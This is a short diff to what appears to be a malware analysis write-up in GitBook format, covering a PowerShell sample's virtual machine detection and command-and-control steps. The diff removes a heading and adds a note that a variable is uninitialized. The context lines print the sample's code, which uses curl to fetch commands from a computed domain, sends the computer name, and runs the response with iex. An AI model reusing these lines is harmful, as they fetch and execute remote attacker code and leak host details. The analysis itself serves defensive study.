@@ -45,8 +45,6 @@ $global:block=(curl -useb "http://$hnlgsefjtpoad0v4six3dtr7bw21q/$znbh12dufj4tr7
 
 </details>
 
-Check display adapter DAC type
-
 {% stepper %}
 {% step %}
 ### Detect if the system is a virtual machine
@@ -155,10 +153,9 @@ $page_name="$($random_str)htr$($findom)";
 $next_command=(curl -useb "http://$domain_name/$page_name.php?id=$env:computername&key=$key&s=flibabc13");
 iex $next_command
 ```
+
+{% hint style="info" %}
+The variable `$findom` is not initialized anywhere in the script.&#x20;
+{% endhint %}
 {% endstep %}
 {% endstepper %}
-
-
-
-
-
